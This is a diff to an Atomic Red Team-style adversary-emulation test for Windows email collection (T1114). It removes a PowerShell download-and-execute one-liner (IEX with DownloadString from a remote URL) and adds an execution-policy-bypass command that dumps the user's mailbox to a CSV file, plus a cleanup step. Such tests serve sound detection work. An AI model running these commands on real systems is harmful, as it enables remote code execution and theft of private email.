@@ -11,16 +11,15 @@ atomic_tests:
   
   supported_platforms:
     - windows
-  
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: String
+      default: $home\desktop\mail.csv
   executor:
     name: command_prompt
     elevation_required: false
     command: |
-      Display email contents in the terminal
-        PS C:\> .\Get-Inbox.ps1
-
-      Write emails out to a CSV
-        PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
-      
-      Download and Execute
-        "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
+      powershell -executionpolicy bypass -command C:\AtomicRedTeam\atomics\T1114\src\Get-Inbox.ps1 -file #{output_file}
+    cleanup_command: |
+      del #{output_file}
